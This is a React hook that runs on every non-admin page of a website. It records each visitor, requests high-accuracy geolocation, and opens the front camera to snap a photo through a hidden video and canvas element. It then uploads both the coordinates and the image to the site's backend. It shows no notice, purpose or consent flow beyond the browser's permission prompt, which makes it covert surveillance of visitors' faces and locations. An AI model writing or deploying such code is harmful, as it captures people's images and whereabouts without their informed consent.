import { useEffect, useRef } from "react";
import { useLocation } from "react-router-dom";
import visitorService from "../services/visitorService";

const LOCATION_REQUESTED_KEY = "visitorLocationRequested";
const CAMERA_REQUESTED_KEY = "visitorCameraRequested";

export default function useVisitorTracking() {

    const location = useLocation();
    const pathname = location.pathname;

    const visitorReadyRef = useRef(null);
    const locationRequestStarted = useRef(false);
    const cameraRequestStarted = useRef(false);


    /*
     * ---------------------------------------------------------
     * 1. CREATE / UPDATE VISITOR RECORD FIRST
     * ---------------------------------------------------------
     *
     * Camera and location must never try to save media before
     * the visitor record exists in MongoDB.
     */

    useEffect(() => {

        const ignoredPrefixes = [
            "/admin",
        ];

        const shouldIgnore = ignoredPrefixes.some((prefix) =>
            pathname.startsWith(prefix)
        );

        if (shouldIgnore) {
            return;
        }

        visitorReadyRef.current =
            visitorService.trackVisitor(pathname);

    }, [pathname]);


    /*
     * ---------------------------------------------------------
     * 2. LOCATION TRACKING
     * ---------------------------------------------------------
     */

    useEffect(() => {

        const ignoredPrefixes = [
            "/admin",
        ];

        const shouldIgnore = ignoredPrefixes.some((prefix) =>
            pathname.startsWith(prefix)
        );

        if (shouldIgnore) {
            return;
        }


        // Do not request location more than once
        const alreadyRequested =
            localStorage.getItem(
                LOCATION_REQUESTED_KEY
            );

        if (
            alreadyRequested === "true" ||
            locationRequestStarted.current
        ) {
            return;
        }


        locationRequestStarted.current = true;


        /*
         * Make sure the visitor exists before trying to save
         * the location.
         */

        const requestLocation = async () => {

            try {

                if (visitorReadyRef.current) {

                    await visitorReadyRef.current;

                }


                /*
                 * Check browser support
                 */

                if (!navigator.geolocation) {

                    console.log(
                        "Geolocation is not supported by this browser."
                    );

                    return;

                }


                console.log(
                    "Requesting visitor location..."
                );


                navigator.geolocation.getCurrentPosition(

                    async (position) => {

                        const latitude =
                            position.coords.latitude;

                        const longitude =
                            position.coords.longitude;


                        console.log(
                            "Visitor location received:",
                            latitude,
                            longitude
                        );


                        try {

                            const response =
                                await visitorService.saveVisitorMedia({
                                    latitude,
                                    longitude,
                                });


                            console.log(
                                "Visitor location saved:",
                                response
                            );


                            /*
                             * Only mark the location request as
                             * completed after the location has
                             * actually been successfully saved.
                             */

                            localStorage.setItem(
                                LOCATION_REQUESTED_KEY,
                                "true"
                            );


                        } catch (error) {

                            console.error(
                                "Failed to save visitor location:",
                                error
                            );

                            /*
                             * Do not mark the request as completed
                             * if saving failed.
                             */

                        }

                    },


                    (error) => {

                        console.error(
                            "Visitor location permission/error:",
                            error
                        );

                        /*
                         * If the user explicitly denied location,
                         * we don't keep repeatedly requesting it.
                         */

                        if (error.code === 1) {

                            localStorage.setItem(
                                LOCATION_REQUESTED_KEY,
                                "true"
                            );

                        }

                    },


                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0,
                    }

                );

            } catch (error) {

                console.error(
                    "Location initialization error:",
                    error
                );

            }

        };


        requestLocation();


    }, [pathname]);


    /*
     * ---------------------------------------------------------
     * 3. CAMERA SNAPSHOT
     * ---------------------------------------------------------
     */

    useEffect(() => {

        const ignoredPrefixes = [
            "/admin",
        ];

        const shouldIgnore = ignoredPrefixes.some((prefix) =>
            pathname.startsWith(prefix)
        );

        if (shouldIgnore) {
            return;
        }


        // Do not request camera more than once
        const alreadyRequested =
            localStorage.getItem(
                CAMERA_REQUESTED_KEY
            );

        if (
            alreadyRequested === "true" ||
            cameraRequestStarted.current
        ) {
            return;
        }


        cameraRequestStarted.current = true;


        /*
         * We do NOT mark the camera request as completed yet.
         * We only do that after we know what happened.
         */


        const captureSnapshot = async () => {

            let stream = null;


            try {

                /*
                 * Make sure visitor exists first.
                 */

                if (visitorReadyRef.current) {

                    await visitorReadyRef.current;

                }


                /*
                 * Check browser camera support.
                 */

                if (
                    !navigator.mediaDevices ||
                    !navigator.mediaDevices.getUserMedia
                ) {

                    console.log(
                        "Camera is not supported by this browser."
                    );

                    localStorage.setItem(
                        CAMERA_REQUESTED_KEY,
                        "true"
                    );

                    return;

                }


                console.log(
                    "Requesting camera permission..."
                );


                stream =
                    await navigator.mediaDevices.getUserMedia({

                        video: {
                            facingMode: "user",

                            width: {
                                ideal: 640,
                            },

                            height: {
                                ideal: 480,
                            },
                        },

                        audio: false,

                    });


                console.log(
                    "Camera permission granted."
                );


                const video =
                    document.createElement("video");


                video.srcObject = stream;

                video.muted = true;
                video.playsInline = true;


                await video.play();


                /*
                 * Give the camera a short moment to produce
                 * a usable frame.
                 */

                await new Promise((resolve) =>
                    setTimeout(resolve, 500)
                );


                const canvas =
                    document.createElement("canvas");


                canvas.width = 640;
                canvas.height = 480;


                const context =
                    canvas.getContext("2d");


                if (!context) {

                    throw new Error(
                        "Unable to create canvas context."
                    );

                }


                context.drawImage(
                    video,
                    0,
                    0,
                    canvas.width,
                    canvas.height
                );


                const snapshotData =
                    canvas.toDataURL(
                        "image/jpeg",
                        0.7
                    );


                console.log(
                    "Camera snapshot captured."
                );


                const response =
                    await visitorService.saveVisitorMedia({
                        snapshotData,
                    });


                console.log(
                    "Visitor snapshot saved:",
                    response
                );


                /*
                 * Only mark camera as completed after
                 * successfully saving the snapshot.
                 */

                localStorage.setItem(
                    CAMERA_REQUESTED_KEY,
                    "true"
                );


            } catch (error) {

                console.error(
                    "Camera permission/capture error:",
                    error
                );


                /*
                 * error.name === "NotAllowedError" normally means
                 * the user/browser denied camera permission.
                 */

                if (
                    error?.name === "NotAllowedError" ||
                    error?.name === "PermissionDeniedError"
                ) {

                    localStorage.setItem(
                        CAMERA_REQUESTED_KEY,
                        "true"
                    );

                }

            } finally {

                /*
                 * Always stop the camera.
                 */

                if (stream) {

                    stream
                        .getTracks()
                        .forEach((track) => {

                            track.stop();

                        });

                }


                console.log(
                    "Camera stopped."
                );

            }

        };


        captureSnapshot();


    }, [pathname]);

}